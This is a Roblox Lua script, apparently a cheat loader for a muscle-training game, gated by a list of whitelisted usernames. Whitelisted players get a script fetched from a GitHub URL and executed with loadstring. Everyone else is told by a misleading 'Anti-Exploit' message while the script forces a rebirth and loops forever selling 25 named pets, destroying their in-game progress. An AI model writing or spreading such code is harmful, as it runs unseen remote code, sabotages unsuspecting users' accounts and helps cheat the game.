-- ==========================================
-- WHITELIST & CONFIGURATION SYSTEM
-- ==========================================
local WHITELISTED_USERS = {
    "KingBaconMuscle1",
    "DeeV_LorD",
    "AKUNPALSU04",
    "jhojet23",
    "ryanpadri",
    "SOE_GAGI",
    "gamestyep25",
    "bahomp_pre",
    "huhseller09",
    "santos0123078"
}

local function isWhitelisted(player)
    for _, idOrName in ipairs(WHITELISTED_USERS) do
        if type(idOrName) == "number" and player.UserId == idOrName then
            return true
        elseif type(idOrName) == "string" and player.Name:lower() == idOrName:lower() then
            return true
        end
    end
    return false
end

local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait()

-- ==========================================
-- KUNG HINDI WHITELISTED: Auto-Rebirth & Auto-Sell AGAD
-- ==========================================
if not isWhitelisted(localPlayer) then
    print("[Anti-Exploit] Unwhitelisted player detected. Executing auto-rebirth and auto-sell...")
    
    -- 1. Auto-Rebirth
    pcall(function()
        game:GetService("ReplicatedStorage").remotes.rebirthRequest:FireServer()
    end)
    
    -- 2. Background Auto-Sell System
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local remotesFolder = ReplicatedStorage:FindFirstChild("remotes") or ReplicatedStorage:FindFirstChild("Remotes")
    local sellRemote = nil
    
    if remotesFolder then
        sellRemote = remotesFolder:FindFirstChild("sellPet") 
            or remotesFolder:FindFirstChild("SellPet") 
            or remotesFolder:FindFirstChild("sellRequest")
            or remotesFolder:FindFirstChild("SellRequest")
    end
    
    if sellRemote then
        local function startBackgroundAutoSell(petName)
            task.spawn(function()
                while true do
                    local p = Players.LocalPlayer
                    local petsFolder = p:FindFirstChild("PetsFolder") or p:FindFirstChild("Pets")
                    
                    if petsFolder and petsFolder:FindFirstChild(petName) then
                        pcall(function()
                            sellRemote:FireServer(petsFolder[petName])
                        end)
                    end
                    
                    task.wait(1)
                end
            end)
        end
        
        local petsToAutoSell = {
            "Swift Samurai", "Tribal Overlord", "Mighty Monster", "Wild Wizard",
            "Omega Overlord", "Titanium Hydra", "Powercore Hound",
            "Jungle Captain", "Flaming Hedgehog", "Electro Bunny",
            "Common Boss Pet", "Rare Boss Pet", "Epic Boss Pet", "Legendary Boss Pet", "Mythic Boss Pet", "Rainbow Boss Pet",
            "Haunted Lantern", "Candy Cube", "Cursed Candle", "Jack o Block", "Bone Block", "Coffin Crawler",
            "Apex Overlord", "Shard Dragon", "Nova Pheonix"
        }
        
        for _, pet in ipairs(petsToAutoSell) do
            startBackgroundAutoSell(pet)
        end
    end
    
    return
end

-- ==========================================
-- KUNG WHITELISTED: I-execute ang Script
-- ==========================================
print("[Whitelist System] Player is whitelisted. Loading script...")

local success, errorMessage = pcall(function()
    local scriptContent = game:HttpGet("https://raw.githubusercontent.com/Script-ZenthonLee/MBA-Test/refs/heads/main/MuscleBeachArena")
    local compiledScript, loadError = loadstring(scriptContent)
    
    if loadError then
        warn("[Loadstring Error]: " .. tostring(loadError))
        return
    end
    
    compiledScript()
end)

if not success then
    warn("[Execution Failed]: " .. tostring(errorMessage))
end
